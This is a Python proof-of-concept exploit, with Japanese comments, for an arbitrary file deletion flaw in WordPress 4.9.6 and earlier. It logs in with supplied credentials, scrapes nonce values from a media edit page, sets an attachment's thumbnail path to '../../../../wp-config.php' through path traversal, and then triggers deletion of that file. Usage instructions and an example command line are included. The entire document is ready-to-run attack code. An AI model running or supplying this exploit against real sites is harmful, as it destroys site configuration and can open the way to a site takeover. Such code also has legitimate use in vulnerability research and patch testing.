#-*- coding: utf-8 -*-

#Wordpress <= 4.9.6 Arbitrary File Deletion
#Test Attacker Windows 10 Python 2.7
#Test Victim   WordPress4.9.6(PHP 7.2.5)
#How to use
#python poc.py <media edit url> <username> <password>
#example
#python poc.py "http://localhost/wordpress/wp-admin/post.php?post=12&action=edit" admin adminpass

import sys
import re
import requests
import bs4


#WordPressログイン認証情報
target_url = sys.argv[1]
user_name  = sys.argv[2]
password   = sys.argv[3]

match_pattern = '(.*)wp-admin/(.*)'
match_check = re.search(match_pattern, target_url)

login_url  = match_check.group(1) + 'wp-login.php'

login_auth = {
	'log' : user_name,
	'pwd' : password
}

#WordPressへのログイン
s = requests.session()
login_session = s.post(login_url, data=login_auth)


#メディア編集ページへのアクセス・HTMLの取得

edit_session = s.get(target_url, cookies=login_session.cookies)
html = edit_session.text


#HTMLの解析・「_wpnonce」値取得
soup = bs4.BeautifulSoup(html, 'html.parser')
wpnonce1 = soup.find('input', {'id' : '_wpnonce'}).attrs['value']

wpnonce2_url = soup.find('a', {'class' : 'submitdelete deletion'}).attrs['href']
match_pattern = '(.*)_wpnonce=(.*)'
match_check = re.search(match_pattern, wpnonce2_url)
wpnonce2 = match_check.group(2)

#攻撃コード1の送信
attack_data1 = {
	'action'   : 'editattachment',
	'_wpnonce' : wpnonce1,
	'thumb'    : '../../../../wp-config.php'#削除するファイルの指定
}

attack_code1 = s.post(target_url, cookies=login_session.cookies, data=attack_data1)

#攻撃コード2の送信
attack_data2 = {
	'action'   : 'delete',
	'_wpnonce' : wpnonce2
}

attack_code2 = s.post(target_url, cookies=login_session.cookies, data=attack_data2)